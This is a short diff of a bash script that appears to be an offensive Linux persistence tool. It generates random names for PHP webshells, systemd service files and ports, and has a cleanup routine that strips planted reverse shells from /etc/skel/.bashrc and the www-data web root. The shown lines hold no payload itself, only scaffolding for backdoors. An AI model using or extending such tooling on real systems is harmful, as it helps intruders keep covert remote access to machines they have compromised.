@@ -18,8 +18,8 @@ CRON="* * * * *"
 RANDOMPHPFILE=$(echo $(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n').php)
 RANDOMPORT=$(expr 1024 + $RANDOM)
 SHELL="/bin/bash"
-SERVICEFILE=$(echo /etc/systemd/system/$(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n').service)
-SERVICESHELLSCRIPT=$(echo /etc/systemd/system/$(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n').sh)
+SERVICEFILE=$(echo $(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n').service)
+SERVICESHELLSCRIPT=$(echo $(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n').sh)
 
 TMPCLEANBASHRC=$(echo /dev/shm/$(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n'))
 TMPCLEANRCLOCAL=$(echo /dev/shm/$(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n'))
@@ -388,7 +388,7 @@ cleanup() {
 		echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from /etc/skel/.bashrc"
 	fi
 
-	cd $(grep --color=never "www-data" /etc/passwd | awk -F: '{print $6}'); grep -R --color=never "$1" . | awk -F: '{print $1}' | xargs $REMOVALTOOL 2> /dev/null && echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from $(grep --color=never "www-data" /etc/passwd | awk -F: '{print $6}')/*"
+	cd $(grep --color=never "www-data" /etc/passwd | awk -F: '{print $6}'); grep -R --color=never "$1" . | awk -F: '{print $1}' | xargs $REMOVALTOOL 2> /dev/null &> /dev/null && echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from $(grep --color=never "www-data" /etc/passwd | awk -F: '{print $6}')/*"
 
 }
 
